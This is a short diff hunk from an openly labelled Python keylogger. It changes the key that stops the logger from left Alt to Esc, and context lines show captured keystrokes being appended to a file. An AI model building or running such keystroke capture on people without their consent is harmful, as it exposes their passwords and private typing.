@@ -20,7 +20,7 @@ def write_1(key):
         f.write(str(key))             #and saving it as append so that it cannot overwrite the data
 
 def on_release(key):                  #notice the key when releases and also the no. of times pressed.
-    if key == Key.alt_l:              #if esc key is pressed the keylogger will stops.
+    if key == Key.esc:                #if esc key is pressed the keylogger will stops.(Here, you can select which ever key you want to stop the execution)
         
         return False
 
